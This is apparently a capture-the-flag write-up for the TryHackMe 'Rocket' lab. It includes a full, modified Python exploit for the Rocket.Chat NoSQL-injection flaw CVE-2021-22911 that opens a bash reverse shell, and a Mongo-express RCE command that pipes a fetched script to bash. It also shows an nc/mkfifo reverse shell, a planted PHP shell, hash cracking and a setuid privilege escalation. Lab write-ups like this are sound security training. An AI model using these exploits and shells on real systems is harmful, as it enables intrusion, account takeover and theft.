Room: [Rocket](https://tryhackme.com/room/rocket)

Difficulty: Hard

Overview: In this room enumeration is very important, searching for subdomains, modify an exploit to take advantage of a chat program has well a MongoDb web interface. Find and crack hashes to compromise a Bolt CMS server till we privesc to root through cap_setuid+ep capabilities.

------------------------------------------------------------------------------------------------------------------------------------------------------------------

We will start our enumeration fase with nmap, to scan for all open ports on the target system:

```
nmap -sV -sC -p- rocket.thm -oN nmap.txt

-sV    →  Probe open ports to determine service
-sC    →  Scan using the default set of scripts
-p-    →  Scan all ports
-oN    →  Save the ouput of the scan in a file
```

![image](https://user-images.githubusercontent.com/76821053/128163183-1559a8ae-e8b5-4f78-a682-eee3decda6a7.png)

There are only two ports open on the target system:

22 → OpenSSH 7.6p1

80 → Apache httpd 2.4.29

At the http server we have a normal website, besides finding users emails, there is not much in it:

![image](https://user-images.githubusercontent.com/76821053/128163265-82540661-e891-4bb8-9dde-7ca858de51b8.png)

![image](https://user-images.githubusercontent.com/76821053/128163288-32f290b2-bd3c-4214-9c80-e88d49a4be76.png)

When checking Wappalyzer firefox addon i found out that this webpage was built with Bolt CMS, so we can check if there is a default bolt login portal:

![image](https://user-images.githubusercontent.com/76821053/128163349-549551d0-a871-4e63-8931-e18141340ac9.png)

For now we cannot do much with it, maybe some brute forcing.. but let's leave it for now.
 
Decided to run gobuster to see if we can find any hidden directories:

![image](https://user-images.githubusercontent.com/76821053/128163410-cc9b5a1b-ae6d-4bd2-b2d8-1c1918d4f6ba.png)

Since nothing groundbraking was found with "gobuster" let us try and also search for subdomains:

```
/home/kali/go/bin/ffuf -c -u 'http://rocket.thm' -H 'host: FUZZ.rocket.thm' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fc 301 -mc all 
```

![image](https://user-images.githubusercontent.com/76821053/128164098-14e2aa19-1ee8-453e-862e-18f246674636.png)

With ffuf we have found a subdomain that hosts a chat app called rocket.chat. After a quick search at exploit-db.com we can see that there is a recent entry for a Rocket.chat rce exploit.

This exploit has a CVE number of CVE-2021-22911, which let us exploit the server through NoSQL injection, hijacking user accounts (like admin), escalate privileges, and execute arbitrary system commands on the host server.

![image](https://user-images.githubusercontent.com/76821053/128164223-c6f5e70b-7870-4ffb-b7b6-e4d8147e7fdb.png)

There is more information about this exploit at https://blog.sonarsource.com/nosql-injections-in-rocket-chat and at https://github.com/CsEnox/CVE-2021-22911.

We need a normal user to start the exploit, let us create one by registering a new user:

![image](https://user-images.githubusercontent.com/76821053/128164295-0e06ce08-6238-4b3a-9849-8d46286eeea3.png)

Let's assume that the administrator user has the name of admin, since we are in a public chat with him. Also take a look at the rc_token, which is the one we are going to abuse and hijack admin password token through nosql injection.

![image](https://user-images.githubusercontent.com/76821053/128164374-0b2bd4ba-5b0a-41af-b9b3-c05c5e185ea1.png)

Running the exploit against the server may take a while. The injection is time base, so it will take some time to get the token hash.

```
python3 ./rocket_rce_50108.py -u test@test.com -a admin@rocket.thm -t 'http://chat.rocket.thm'
```

When running the exploit, at the end i receive an error.  ****Non-base32 digit found **** . 

![image](https://user-images.githubusercontent.com/76821053/128164476-8b4b1352-044e-48a9-9486-ce130086e4d7.png)

After some web searching i found found out that it errors out because there is no 2fa secret key, so the admin account isn't protected by 2fa. This means that the exploit wasn't able to change the password. Now i need to modify the exploit to not use the 2fa code.

Let us try and change the exploit a bit to see if we can bypass the 2fa code and execute a custom rce.

```python
#!/usr/bin/python

import requests
import string
import time
import hashlib
import json
import argparse

parser = argparse.ArgumentParser(description='RocketChat 3.12.1 RCE')
parser.add_argument('-u', help='Low priv user email [ No 2fa ]', required=True)
parser.add_argument('-a', help='Administrator email', required=True)
parser.add_argument('-t', help='URL (Eg: http://rocketchat.local)', required=True)
parser.add_argument('-i', help='Ip_address', required=True)
parser.add_argument('-p', help='port', required=True)
args = parser.parse_args()


adminmail = args.a
lowprivmail = args.u
target = args.t
port = args.p
ip_address = args.i


def forgotpassword(email,url):
	payload='{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"sendForgotPasswordEmail\\",\\"params\\":[\\"'+email+'\\"]}"}'
	headers={'content-type': 'application/json'}
	r = requests.post(url+"/api/v1/method.callAnon/sendForgotPasswordEmail", data = payload, headers = headers, verify = False, allow_redirects = False)
	print("[+] Password Reset Email Sent")


def resettoken(url):
	u = url+"/api/v1/method.callAnon/getPasswordPolicy"
	headers={'content-type': 'application/json'}
	token = ""

	num = list(range(0,10))
	string_ints = [str(int) for int in num]
	characters = list(string.ascii_uppercase + string.ascii_lowercase) + list('-')+list('_') + string_ints

	while len(token)!= 43:
		for c in characters:
			payload='{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"getPasswordPolicy\\",\\"params\\":[{\\"token\\":{\\"$regex\\":\\"^%s\\"}}]}"}' % (token + c)
			r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
			time.sleep(0.5)
			if 'Meteor.Error' not in r.text:
				token += c
				print(f"Got: {token}")

	print(f"[+] Got token : {token}")
	return token


def changingpassword(url,token):
	payload = '{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"resetPassword\\",\\"params\\":[\\"'+token+'\\",\\"P@$$w0rd!1234\\"]}"}'
	headers={'content-type': 'application/json'}
	r = requests.post(url+"/api/v1/method.callAnon/resetPassword", data = payload, headers = headers, verify = False, allow_redirects = False)
	if "error" in r.text:
		exit("[-] Wrong token")
	print("[+] Password was changed !")

def rce(url,ip_address,port):
	# Authenticating
	sha256pass = hashlib.sha256(b'P@$$w0rd!1234').hexdigest()
	headers={'content-type': 'application/json'}
	payload = '{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"login\\",\\"params\\":[{\\"user\\":{\\"email\\":\\"'+"admin@rocket.thm"+'\\"},\\"password\\":{\\"digest\\":\\"'+sha256pass+'\\",\\"algorithm\\":\\"sha-256\\"}}]}"}'
	r = requests.post(url + "/api/v1/method.callAnon/login",data=payload,headers=headers,verify=False,allow_redirects=False)
	if "error" in r.text:
		exit("[-] Couldn't authenticate")
	data = json.loads(r.text)
	data =(data['message'])
	userid = data[32:49]
	token = data[60:103]
	print("[+] Succesfully authenticated as administrator")

	# Creating Integration
	payload = '{"enabled":true,"channel":"#general","username":"admin",'
	payload += '"name":"wow","alias":"","avatarUrl":"","emoji":"",'
	payload += '"scriptEnabled":true,"script":'
	payload += '"class Script {\\n\\n  process_incoming_request({ request }) {\\n\\n\\tconst require = console.log.constructor(\'return process.mainModule.require\')();\\n\\tconst { exec } = require(\'child_process\');\\n\\texec(\'bash -c \\\"bash -i >& /dev/tcp/' + str(ip_address) + '/' + str(port) + ' 0>&1\\\"\');\\n}\\n}",'
	payload += '"type":"webhook-incoming"}'

	cookies = {'rc_uid': userid,'rc_token': token}
	headers = {'X-User-Id': userid,'X-Auth-Token': token}
	r = requests.post(url+'/api/v1/integrations.create',cookies=cookies,headers=headers,data=payload)
	data = r.json()
	_id = data["integration"]["_id"]
	token = data["integration"]["token"]

	# Triggering RCE
	u = url + '/hooks/' + _id + '/' +token 
	r = requests.get(u) 
	print(r.text)

############################################################


# Getting Low Priv user
print(f"[+] Resetting admin  password")
## Sending Reset Mail
forgotpassword("admin@rocket.thm",target)

## Getting reset token through blind nosql injection
token = resettoken(target)

## Changing Password
changingpassword(target,token)

## Authenticating and triggering rce
input("Start nc listener on your chosen port and press 'Enter'")
rce(target,ip_address,port)
```

At this stage i spent alot of time testing different lines of code, searched for many hours and did countless attempts to get the payload to work. I had to use a modified snipet of code for the payload part from someone else and i manage to get it to work. 

Now we can test our custom rocket.chat exploit to see if we recieve a shell on our attacker machine:

```
python3 ./rocket_chat_exploit.py -u test@test.com -a admin@rocket.thm -t 'http://chat.rocket.thm' -i my_ip_address -p 9001
```

![image](https://user-images.githubusercontent.com/76821053/128165312-df1ba041-d709-4673-a02c-ed824590f6c8.png)

Success the exploit worked, it privesc to admin and executed a custom bash reverse shell:

![image](https://user-images.githubusercontent.com/76821053/128165342-18106b2a-cdc1-4031-9ccc-7c915e90067b.png)

After looking around, in the environment variables there is a MongoDB Web Interface running on port 8081:

![image](https://user-images.githubusercontent.com/76821053/128165515-f04720a8-3696-4936-9239-629014d073f5.png)

Let explore more and try set up a reverse proxy through the target machine using a tool called “chisel”.

Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server. We can find this tool [here](https://github.com/jpillora/chisel).

To set this up we need to upload this tool to the target machine, the problem is that we cannot use curl or wget to do so. I learned a very usefull way to do it, we are going to copy it through the clipboard.

First we need to encode the app with base64.

```
cat chisel | base64 -w400 > chisel_encoded
```

![image](https://user-images.githubusercontent.com/76821053/128165638-b0c12417-a72d-4b59-8227-598fecac8662.png)

Now we need to copy its encoded contents and paste it in the target machine like so:

```
cat <<EOF > chisel.base64
```

Now paste it in, with 'shift'+'insert' or 'ctrl'+'+'.

![image](https://user-images.githubusercontent.com/76821053/128165769-8f773a7e-be3b-420e-9b1f-a62e08713b6f.png)

To finnish press enter to give it a new line and break it with command EOF.

![image](https://user-images.githubusercontent.com/76821053/128165989-e1268eb1-c73e-4bf0-9311-f74a65edbcfa.png)

We have to decode the file and give it execute permission so we can run the program:

```
cat chisel.base64 | base64 -d > chisel

chmod +x chisel
```

![image](https://user-images.githubusercontent.com/76821053/128166031-adab6953-5216-4af3-99e7-34646cf95618.png)

With “chisel” we need to setup a server on the attacker machine and then a client on the target machine to connect back to our server:

On the attacker machine:

```
./chisel server -p 8000 --reverse
```

![image](https://user-images.githubusercontent.com/76821053/128166099-1cf3e47f-f0a0-477d-ab62-b7cf373cdf32.png)

On the client machine:

```
./chisel client server_ip:8000 R:8081:172.17.0.4:8081
```

![image](https://user-images.githubusercontent.com/76821053/128166171-ec457b21-4980-44cf-95e6-c7df55bd63a8.png)

Now we can try and access it through the browser:

![image](https://user-images.githubusercontent.com/76821053/128166223-b0eb3a55-5a07-4489-9a99-dcacc1e5a24e.png)

It asked for credentials. So let use curl to see if we can find more information:

![image](https://user-images.githubusercontent.com/76821053/128166263-a73c7ed6-95c1-4f35-b62d-28ad0560987c.png)

Looking at the curl output we see that MongoDB web interface might be a Mongo-express server.

Searching for more information on Mongo-express i found out that there is an exploit for it with a CVE of CVE-2019-10758.

This exploit is a Remote Code Execution (RCE) via endpoints that use the toBSON method. It allows us to exec commands in a non-safe environment.

Check this [github page](https://github.com/masahiro331/CVE-2019-10758) to see how the exploit works. 

We need to create a bash script payload so we can send it to the Mongo-express server and execute it there:

``` bash
#!/bin/bash

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP_ADDRESS PORT >/tmp/f
```

![image](https://user-images.githubusercontent.com/76821053/128167014-e97f5f60-a760-4c21-9d30-36a63c6e87a9.png)

Now we have to host the file in a server, we can use python's SimpleHTTPServer to do so. Then we just need to tweak the exploit a bit by asking it to execute curl, download our bash script and pipe it to run with bash:

```
curl 'http://localhost:8081/checkValid' -H 'Authorization: Basic YWRtaW46cGFzcw=='  --data 'document=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("curl http://YOUR_IP_ADDRESS:9000/reverse_shell.sh | bash")'
```

![image](https://user-images.githubusercontent.com/76821053/128167082-89b31731-5b4b-4f56-87ed-dbfa72d687c5.png)

Success we recieve a shell on our nc listener port:

![image](https://user-images.githubusercontent.com/76821053/128167118-66f674ec-ddad-46a5-93ff-80fba3e2e2fe.png)

There aren't any flags on the server, so enumerating further we can find a backups directory.

Inside  /backup/db_backup/meteor there are two files with possible password hashes:

![image](https://user-images.githubusercontent.com/76821053/128167388-0b42be98-1ea8-408e-9b86-3185db3595b3.png)

Since bson.hash is in clear text, lets try and crack it with john the ripper:

```
echo 'Terrance:$2y$04$cPMSyJolnn5/p0X.B3DMIevZ9M.qiraQw.wY9rgf4DrFp0yLA5DHi' > terrance.hash

john terrance.hash --wordlist=/usr/share/wordlists/rockyou.txt

```

![image](https://user-images.githubusercontent.com/76821053/128167496-6781d1d6-4e5d-44fc-915e-50576235a107.png)

We have credentials for user “terrance”. We can use them against the http://rocket.thm/bolt/login portal.

![image](https://user-images.githubusercontent.com/76821053/128167540-e1135fa3-33d9-4fd1-85c6-d3d319f48756.png)

To get a reverse shell connection from the web server we can do it two ways:

We can change the bundles.php file in the “configuration/All configuration files” tab. So i change its contents for a php payload from pentestmonkey.

Change this fields on the Pentestmonkey php reverse shell:

![image](https://user-images.githubusercontent.com/76821053/128167625-9d7c2999-7c5a-4314-bafe-32ac833c5210.png)

Edit and save the bundles.php file:

![image](https://user-images.githubusercontent.com/76821053/128167651-5d76dad9-94ea-407b-9cde-dfad1ccfc2b5.png)

Setup the listener, refresh the page and recieve the shell:

![image](https://user-images.githubusercontent.com/76821053/128167713-23f80bd8-175a-40d2-aefe-ac9a21d93319.png)

Another way is at “Main configuration” where we can change the permissions on the config.yaml to accept file uploads of .php format:

![image](https://user-images.githubusercontent.com/76821053/128167793-9868f140-69d5-4cf5-b607-cf6a82347ed2.png)

Now the server will let us upload a .php file to it:

![image](https://user-images.githubusercontent.com/76821053/128167830-0cdf4748-6567-4674-9a34-1d9e4f94d60e.png)

To trigger the exploit use this option:

![image](https://user-images.githubusercontent.com/76821053/128167868-ce3f0c14-3bb3-4952-b71b-8c8749100d37.png)

And in our listener we recieve a reverse shell.

![image](https://user-images.githubusercontent.com/76821053/128167901-522b2dbf-caa5-4085-850a-6920d72ce299.png)

To upgrade the shell to a fully interactive tty shell in order use commands like sudo, etc.. we can use this command:

```
python3 -c "__import__('pty').spawn('/bin/bash')"
```

![image](https://user-images.githubusercontent.com/76821053/128167994-c1562848-521e-4ffb-b568-a0b6ede80362.png)

The user.txt flag is in alvin's home directory:

![image](https://user-images.githubusercontent.com/76821053/128168019-bc8ce694-23bc-43f6-9916-d201c151e5d3.png)

I Transfer linpeas.sh to the target machine to enumerate it further:

![image](https://user-images.githubusercontent.com/76821053/128168087-6acbcd71-37fd-418e-a435-a2d4bd9d6500.png)

And found a privesc that i already exploited in the past:

![image](https://user-images.githubusercontent.com/76821053/128168120-40684297-c130-4ad1-8255-a3611f43137b.png)

When i tried to use sudo i got an error, it didn't work has supposed too.

![image](https://user-images.githubusercontent.com/76821053/128168177-907fadd8-6678-43e5-826b-2bbd80d6f27f.png)

To privesc we need to upgrade our shell to ssh. I had some problems getting ssh to work with user alvin.

I created an ssh private key with ssh-keygen but when i tried to connect to it with ssh i was getting asked for a password everytime.

![image](https://user-images.githubusercontent.com/76821053/128168320-9e161902-3050-46a2-8132-b7cd595fe38a.png)

I'll explain how i solved this issue in a step by step on how i get it working in case you have the same problem.

• First i created a private key with ssh-keygen and didn't set any passphrase:

![image](https://user-images.githubusercontent.com/76821053/128168354-c9dbf03d-9ffe-4873-9118-3c0e7c5b1e0f.png)

• Second - Inside ~/.ssh i create a file called "authorized_keys".

![image](https://user-images.githubusercontent.com/76821053/128168415-e070b180-9821-43b5-ab5f-d60235a2645b.png)

• Third - I copied the contents of id_rsa.pub into authorized_keys file.

![image](https://user-images.githubusercontent.com/76821053/128168491-45454ef1-0fef-495d-a02b-f9d2620dcf38.png)

• Forth - This one here was the main thing i had to do to get it to work, i have change the authorized_keys file permissions to 700.

![image](https://user-images.githubusercontent.com/76821053/128168553-e4997e6b-dd44-4260-9068-d6bcb92260ad.png)

• Fifth - I copied the id_rsa private key to my attacker machine, changed its permissions to 600 and connected to the target machine.

![image](https://user-images.githubusercontent.com/76821053/128168594-bfdf05d0-d36f-4b81-adb4-56244a10641e.png)

Now with a proper shell lets try to exploit “ruby2.5 cap_setuid+ep” capabilities, and for that we can check [GFTOBins](https://gtfobins.github.io/):

![image](https://user-images.githubusercontent.com/76821053/128168632-8e230935-cae7-442a-a8eb-5e0e54aad6c2.png)

First let's check ruby2.5:

![image](https://user-images.githubusercontent.com/76821053/128168654-33127043-9315-4701-993b-85a6efbb12ee.png)

When following the steps i found out that it didn't work:

![image](https://user-images.githubusercontent.com/76821053/128168682-c2c340d9-65f1-4008-b5dd-730738a7e575.png)

We got an error: "Errno::EPERM", it means that the user is not privileged and uid does not match the real UID or saved set-user-ID of the calling process.

I was stuck here for a while, until i discover that apparmor was limiting the capabilities of ruby2.5.

I search the system for ruby2.5:

```
find / -type f 2>/dev/null | grep ruby
```

![image](https://user-images.githubusercontent.com/76821053/128168769-e08c020f-1521-442c-a915-97a11dcef495.png)

What is the job of AppArmor?  It's security model is to bind access control attributes to programs rather than to users. Which means ruby2.5 program has a set of binaries that have different permissions and these permissions are controlled by the apparmor defined rules and not the users.

![image](https://user-images.githubusercontent.com/76821053/128168844-1e662697-02d6-40ea-ac62-16a0654a56af.png)

When analizing ruby2.5 apparmor setuid capabilities "/tmp/.X[0-9]-lock rw," has read and write capabilities. Let us try to exploit it!
 
I made a copy of /bin/bash to /tmp and changed its name to match ".X[0-9]-lock" binary and then set the SUID bit to it:

![image](https://user-images.githubusercontent.com/76821053/128169188-72919445-f307-48c9-80eb-f4bd28209769.png)

Running the GTFOBins command we got a diffent error:

![image](https://user-images.githubusercontent.com/76821053/128169229-d1bb22d5-5ebc-4d40-8cd6-feaf06c3f60d.png)

We need our lock binary to maintain privileges, so lets change the GTFOBins command a bit so we can make a new copy of x-lock and see if we can change its ownership:

```
usr/bin/ruby2.5 -e 'Process::Sys.setuid(0); exec "cp --preserve=mode /tmp/.X1-lock /tmp/.X2-lock"'
```

![image](https://user-images.githubusercontent.com/76821053/128169373-7bb18ef5-06a9-4b97-9730-452c99ee537d.png)

![image](https://user-images.githubusercontent.com/76821053/128169403-64dc9355-e60d-4295-9253-90d44a36fb38.png)

Success, since /bin/bash is disguised has .x2-lock binary in the /tmp directory we can just run it referencing -p for persistence and escalate our privileges!!

![image](https://user-images.githubusercontent.com/76821053/128169452-21c87c60-5956-41e1-81e1-6de400799c04.png)

AND FINALY THE LAST FLAG!

![image](https://user-images.githubusercontent.com/76821053/128169598-ff1dbfa3-a37c-4e7c-8b87-d3cdc7a0f1e7.png)


